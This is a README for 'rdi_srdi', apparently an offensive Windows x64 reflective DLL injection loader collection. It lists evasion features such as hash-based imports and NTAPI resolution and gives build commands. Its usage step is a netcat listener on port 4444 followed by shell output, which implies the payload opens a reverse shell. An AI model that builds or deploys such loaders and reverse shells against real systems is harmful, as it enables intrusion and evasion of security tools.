# rdi_srdi
```
Windows x64 reflective / RDI / SRDI loader collection with NTAPI-driven file staging, PE mapping, relocations, IAT resolution, section protection, and DllMain transfer.
```
## Overview

- **Target OS:** Windows
- **Architecture:** x64
- **Language:** C++ / NASM
- **Type:** Loader / Reflective DLL Injection

## Key Capabilities & OpSec

- **Evasion Features:** NTAPI resolution, hash-based imports, relocations, section protection, TLS callback handling
- **Execution Model:** In-memory PE mapping and DllMain dispatch
- **Dependencies:** Custom headers, Win32/NTDLL only

## Compilation & Usage

### Prerequisites
```bash
- x86_64-w64-mingw32-g++
- nasm
- cmake (optional)
- make (optional)
```

## Workspace Extraction & Clean Checkout
```bash
git clone --filter=blob:none --no-checkout <REPOSITORY_URL>
cd <REPO_FOLDER>
git sparse-checkout init --cone
git sparse-checkout set "rdi_srdi"
git checkout
rm -rf .git
```
## DLL
```bash
x86_64-w64-mingw32-g++ -shared -o main.dll main.cpp -static -luser32 -lkernel32 -fpermissive -std=c++26
wine rundll32.exe main.dll,DllMain
```


## make loader.cpp loader_srdi.cpp loader_r.cpp
```bash
x86_64-w64-mingw32-g++ loader.cpp src/c/utils.cpp -o loader.exe -static -static-libgcc -static-libstdc++ -luser32 -lkernel32 -std=c++26 -g
wine loader.exe
```

### Build Commands
```bash
cmake -S . -B build
cmake --build build
```

### Legacy / Manual Build
```bash
x86_64-w64-mingw32-g++ -c src/c/peb.cpp -o peb.o
x86_64-w64-mingw32-g++ -c src/c/ntutils.cpp -o ntutils.o
x86_64-w64-mingw32-g++ -c src/c/utils.cpp -o utils.o
x86_64-w64-mingw32-g++ loader_r.o ntutils.o peb.o utils.o -o loader.exe -nostdlib -nostartfiles -nodefaultlibs -Wl,-eentry -lkernel32
```
### Usage
```bash
nc -nlvp 4444
Volume in drive Z has no label.
Volume Serial Number is ae54-7910
```